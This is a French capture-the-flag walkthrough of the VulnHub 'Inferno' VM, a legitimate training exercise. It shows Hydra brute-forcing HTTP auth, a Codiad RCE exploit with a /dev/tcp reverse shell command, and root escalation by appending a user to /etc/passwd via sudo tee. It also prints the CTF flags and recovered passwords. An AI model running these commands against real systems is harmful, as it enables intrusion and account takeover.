---
title: "Solution du CTF Inferno de VulnHub"
tags: [CTF,VulnHub]
---

[Inferno](https://vulnhub.com/entry/inferno-11,603/) est un CTF créé par [mindsflee](https://twitter.com/mindsflee) et disponible sur *VulnHub*.

## L'enfer est pavé de bonnes intentions

La VM expose un serveur Apache sur lequel on trouve une page avec une image, rien de plus.

Une énumération pour rechercher des dossiers me ramène ce path qui réclame des identifiants.

```
401       14l       54w      461c http://192.168.56.224/inferno
```

Vu le thème du CTF,j'imagine que le nom d'utilisateur est soit `dante` soit `admin`. Je mets les deux dans un fichier et je lance un brute force avec `Hydra` :

```console
$ hydra -u -L users.txt -P rockyou.txt http-head://192.168.56.224/inferno
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] http-head auth does not work with every server, better use http-get
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688762 login tries (l:2/p:14344381), ~1793048 tries per task
[DATA] attacking http-head://192.168.56.224:80/inferno
[STATUS] 8978.00 tries/min, 8978 tries in 00:01h, 28679784 to do in 53:15h, 16 active
[STATUS] 9077.00 tries/min, 27231 tries in 00:03h, 28661531 to do in 52:38h, 16 active
[80][http-head] host: 192.168.56.224   login: admin   password: dante1
```

Une fois passé l'authentification basic on se retrouve face à un `Codiad`. J'ai déjà croisé cet éditeur de texte en ligne sur le [CTF Froggy]({% link _posts/2019-05-21-Solution-du-CTF-Froggy-de-Wizard-Labs.md %}).

Pour accéder à l'éditeur, il y a une mire de login et les mêmes identifiants que précédemment sont acceptés.

Un exploit de type RCE existe et un PoC python est présent sur `exploit-db` : [Codiad 2.8.4 - Remote Code Execution (Authenticated) - Multiple webapps Exploit](https://www.exploit-db.com/exploits/49705)

Afin de passer l'authentification basic il faut ajouter une ligne au script :

```python
session.auth = ("admin", "dante1")
```

L'exploit a un fonctionnement assez particulier : il se connecte sur un port à nous pour lire des commandes et les exécuter :

```console
$ python3 codiad.py http://192.168.56.224/inferno/ admin dante1 192.168.56.1 9999 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/192.168.56.1/10000 0>&1 2>&1"' | nc -lnvp 9999
nc -lnvp 10000
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
```

J'ai dû changer les ports pour adapter à mon firewall mais finalement j'obtiens bien un shell.

Après un moment le shell est stoppé, il s'agit en fait d'une crontab dont on peut observer l'exécution avec [GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy).

```
2023/05/30 12:06:01 CMD: UID=0    PID=25315  | sh /var/www/html/machine_services1320.sh 
2023/05/30 12:06:01 CMD: UID=0    PID=25314  | pkill bash 
2023/05/30 12:06:01 CMD: UID=0    PID=25313  | nc -nvlp 57000
```

Ce script se trouve dans la racine web et ressemble à ceci :

```bash
sudo pkill bash &
nc -nvlp 21 &
nc -nvlp 23 &
nc -nvlp 25 &
nc -nvlp 110 &
nc -nvlp 88 &
nc -nvlp 53 &
nc -nvlp 194 &
nc -nvlp 389 &
nc -nvlp 464 &
nc -nvlp 636 &
--- snip ---
```

Je ne me souviens pas avoir vu tous ces ports ouverts donc j'ai potentiellement scanné au bon moment.

## Un train d'enfer

En faisant exécuter un `reverse-ssh` j'obtiens un shell plus stable.

Je fais un tour des fichiers appartenant au seul utilisateur présent :

```console
www-data@Inferno:/home/dante$ find . -type f -readable -ls 2> /dev/null 
   273333      4 -rw-r--r--   1 dante    dante        3526 Dec  6  2020 ./.bashrc
   276311      0 -rw-r--r--   1 root     root            0 Dec  6  2020 ./Pictures/5.jpg
   276308      0 -rw-r--r--   1 root     root            0 Dec  6  2020 ./Pictures/2.jpg
   276309      0 -rw-r--r--   1 root     root            0 Dec  6  2020 ./Pictures/3.jpg
   276310      0 -rw-r--r--   1 root     root            0 Dec  6  2020 ./Pictures/4.jpg
   276307      0 -rw-r--r--   1 root     root            0 Dec  6  2020 ./Pictures/1.jpg
   276312      0 -rw-r--r--   1 root     root            0 Dec  6  2020 ./Pictures/6.jpg
   276315    136 -rwxr-xr-x   1 root     root       138856 Dec  6  2020 ./Documents/centauro.doc
   276313     28 -rwxr-xr-x   1 root     root        27400 Dec  6  2020 ./Documents/beatrice.doc
   276314    136 -rwxr-xr-x   1 root     root       138728 Dec  6  2020 ./Documents/virgilio.doc
   276317     68 -rwxr-xr-x   1 root     root        68416 Dec  6  2020 ./Documents/caronte.doc
   276316     96 -rwxr-xr-x   1 root     root        97152 Dec  6  2020 ./Documents/cerbero.doc
   276320     36 -rwxr-xr-x   1 root     root        35456 Dec  6  2020 ./Desktop/paradiso.txt
   276319    136 -rwxr-xr-x   1 root     root       138728 Dec  6  2020 ./Desktop/purgatorio.txt
   276318     68 -rwxr-xr-x   1 root     root        68416 Dec  6  2020 ./Desktop/inferno.txt
   273334      4 -rw-r--r--   1 dante    dante         220 Dec  6  2020 ./.bash_logout
   276321    136 -rwxr-xr-x   1 root     root       138728 Dec  6  2020 ./Downloads/CantoI.docx
     7661      4 -rw-r--r--   1 root     root         1511 Nov  3  2020 ./Downloads/.download.dat
   276335     96 -rwxr-xr-x   1 root     root        97152 Dec  6  2020 ./Downloads/CantoXV.docx
   276339    144 -rwxr-xr-x   1 root     root       146880 Dec  6  2020 ./Downloads/CantoXIX.docx
   276322    144 -rwxr-xr-x   1 root     root       146880 Dec  6  2020 ./Downloads/CantoII.docx
   276324     68 -rwxr-xr-x   1 root     root        68416 Dec  6  2020 ./Downloads/CantoIV.docx
   276334    144 -rwxr-xr-x   1 root     root       146880 Dec  6  2020 ./Downloads/CantoXIV.docx
   276327    144 -rwxr-xr-x   1 root     root       146880 Dec  6  2020 ./Downloads/CantoVII.docx
   276337    120 -rwxr-xr-x   1 root     root       121464 Dec  6  2020 ./Downloads/CantoXVII.docx
   276329    136 -rwxr-xr-x   1 root     root       138856 Dec  6  2020 ./Downloads/CantoIX.docx
   276336    136 -rwxr-xr-x   1 root     root       138728 Dec  6  2020 ./Downloads/CantoXVI.docx
   276340     68 -rwxr-xr-x   1 root     root        68416 Dec  6  2020 ./Downloads/CantoXX.docx
   276333    212 -rwxr-xr-x   1 root     root       213136 Dec  6  2020 ./Downloads/CantoXIII.docx
   276325     44 -rwxr-xr-x   1 root     root        43808 Dec  6  2020 ./Downloads/CantoV.docx
   276326    136 -rwxr-xr-x   1 root     root       138856 Dec  6  2020 ./Downloads/CantoVI.docx
   276338   2684 -rwxr-xr-x   1 root     root      2746104 Dec  6  2020 ./Downloads/CantoXVIII.docx
   276330     68 -rwxr-xr-x   1 root     root        68416 Dec  6  2020 ./Downloads/CantoX.docx
   276323     96 -rwxr-xr-x   1 root     root        97152 Dec  6  2020 ./Downloads/CantoIII.docx
   276328   3604 -rwxr-xr-x   1 root     root      3689352 Dec  6  2020 ./Downloads/CantoVIII.docx
   276331    120 -rwxr-xr-x   1 root     root       121464 Dec  6  2020 ./Downloads/CantoXI.docx
   276332    156 -rwxr-xr-x   1 root     root       157192 Dec  6  2020 ./Downloads/CantoXII.docx
   273335      4 -rw-r--r--   1 dante    dante         807 Dec  6  2020 ./.profile
```

On trouve différents fichiers `.doc` et `.txt` qui ne sont en réalité que des exécutables du système copiés sous un autre nom.

Un fichier toutefois attire mon attention :

```console
www-data@Inferno:/home/dante$ cat ./Downloads/.download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```

Je l'ai décodé via [Hex decoder: Online hexadecimal to text converter - cryptii](https://cryptii.com/pipes/hex-decoder)

Dans l'output, on trouve les identifiants `dante:V1rg1l10h3lpm3` qui permettent de faire un `su` pour `dante`.

J'obtiens le premier flag :

```console
dante@Inferno:~$ cat local.txt 
77f6f3c544ec0811e2d1243e2e0d1835
```

L'utilisateur peut exécuter `tee` avec les droits `root`. J'utilise cette permission pour rajouter un utilisateur privilégié au système :

```
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
dante@Inferno:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh | sudo /usr/bin/tee -a /etc/passwd
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
dante@Inferno:~$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
proof.txt
# cat proof.txt


 (        )  (          (        )     )   
 )\ )  ( /(  )\ )       )\ )  ( /(  ( /(   
(()/(  )\())(()/(  (   (()/(  )\()) )\())  
 /(_))((_)\  /(_)) )\   /(_))((_)\ ((_)\   
(_))   _((_)(_))_|((_) (_))   _((_)  ((_)  
|_ _| | \| || |_  | __|| _ \ | \| | / _ \  
 | |  | .` || __| | _| |   / | .` || (_) | 
|___| |_|\_||_|   |___||_|_\ |_|\_| \___/ 


Congrats!

You've rooted Inferno!

77f6f3c544ec0811e2d1243e2e0d1835

mindsflee

https://www.buymeacoffe.com/mindsflee
```
